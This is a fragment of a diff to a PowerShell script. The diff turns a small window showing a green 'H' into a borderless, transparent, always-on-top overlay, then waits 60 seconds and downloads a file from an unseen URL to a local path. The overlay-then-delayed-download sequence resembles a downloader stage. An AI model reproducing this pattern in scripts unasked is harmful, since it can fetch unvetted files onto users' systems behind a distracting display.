@@ -7,19 +7,34 @@ Add-Type -AssemblyName System.Drawing
 
 $form = New-Object System.Windows.Forms.Form
 $form.StartPosition = 'CenterScreen'
-$form.Size = New-Object System.Drawing.Size(200, 100)
-$form.Text = "Display"
+$form.FormBorderStyle = 'None'
+$form.BackColor = [System.Drawing.Color]::Lime
+$form.TransparencyKey = $form.BackColor
+$form.TopMost = $true
+$form.Width = 100
+$form.Height = 100
 
 $label = New-Object System.Windows.Forms.Label
 $label.Text = "H"
 $label.ForeColor = [System.Drawing.Color]::Green
 $label.Font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
 $label.AutoSize = $true
+$label.BackColor = [System.Drawing.Color]::Transparent
 
 $form.Controls.Add($label)
-$label.Anchor = [System.Windows.Forms.AnchorStyles]::None
 $label.Location = New-Object System.Drawing.Point(($form.Width - $label.Width) / 2, ($form.Height - $label.Height) / 2)
-$form.ShowDialog()
+
+$form.Add_MouseDown({
+    $form.Capture = $false
+})
+
+$form.Show()
+
+$form.Location = New-Object System.Drawing.Point(
+    [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width / 2 - $form.Width / 2,
+    [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height / 2 - $form.Height / 2
+)
+
 Start-Sleep -Seconds 60
 
 $webClient.DownloadFile($url, $downloadPath)
